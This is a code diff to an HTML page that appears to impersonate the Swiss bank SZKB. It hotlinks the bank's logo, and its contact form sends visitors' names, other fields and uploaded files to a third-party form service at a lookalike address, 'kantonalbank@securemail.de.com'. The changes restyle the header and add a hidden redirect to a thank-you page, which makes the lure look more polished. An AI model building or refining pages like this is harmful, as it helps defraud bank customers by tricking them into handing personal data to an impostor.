@@ -24,12 +24,23 @@
 
     .logo {
       height: 50px;
-      margin-bottom: 10px;
+      margin-bottom: 0;
+    }
+
+    .header-box {
+      background-color: #fff3f3;
+      padding: 20px;
+      margin: 0 auto;
+      max-width: 600px;
+      border-radius: 12px;
+      margin-top: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
     }
 
     .header-title {
-      font-size: 26px;
-      font-weight: 700;
+      font-size: 22px;
+      font-weight: 600;
+      margin: 0;
     }
 
     main {
@@ -88,7 +99,7 @@
 
     @media (max-width: 600px) {
       .header-title {
-        font-size: 22px;
+        font-size: 20px;
       }
 
       .logo {
@@ -101,11 +112,15 @@
 
   <header>
     <img src="https://www.szkb.ch/ResourcePackages/CorporateWebsite/assets/dist/img/szkb-logo.svg" alt="SZKB Logo" class="logo">
-    <div class="header-title">Wie können wir Ihnen helfen?</div>
+    <div class="header-box">
+      <p class="header-title">Wie können wir Ihnen helfen?</p>
+    </div>
   </header>
 
   <main>
     <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
+      <!-- Weiterleitung nach Absenden -->
+      <input type="hidden" name="_next" value="danke.html">
 
       <label for="name">Ihr Name</label>
       <input type="text" id="name" name="Name" required>
